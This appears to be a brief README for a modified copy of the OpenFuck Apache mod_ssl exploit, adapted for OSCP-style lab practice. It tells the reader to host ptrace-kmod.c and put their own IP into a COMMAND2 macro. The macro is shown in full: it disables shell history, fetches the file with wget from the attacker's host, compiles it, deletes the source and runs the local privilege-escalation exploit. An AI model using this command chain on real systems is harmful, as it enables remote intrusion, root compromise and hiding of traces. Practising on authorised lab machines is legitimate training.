# openfuck_oscp
modified the code on line 671

host  the ptrace-kmod.c 

added the lines export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin to overcome ld error

enter url of the file in the command2

change the url only to execute the code

#define COMMAND2 "unset HISTFILE; cd /tmp;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin; wget http://enter ur ip here/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c; rm ptrace-kmod.c; ./exploit; \n"


